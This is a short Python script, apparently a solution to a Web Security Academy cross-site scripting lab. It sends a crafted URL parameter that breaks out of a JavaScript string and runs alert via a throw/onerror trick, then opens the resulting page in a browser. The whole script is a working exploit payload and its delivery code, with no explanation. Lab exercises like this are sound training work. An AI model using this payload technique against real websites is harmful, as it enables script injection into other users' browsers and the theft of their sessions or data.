import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = "%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27"
final_url = f"{base_url}post?postId=1&{payload}"

response = requests.get(url=final_url)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(response.url)
    webbrowser.open(response.url)
else:
    print("Something went wrong.")

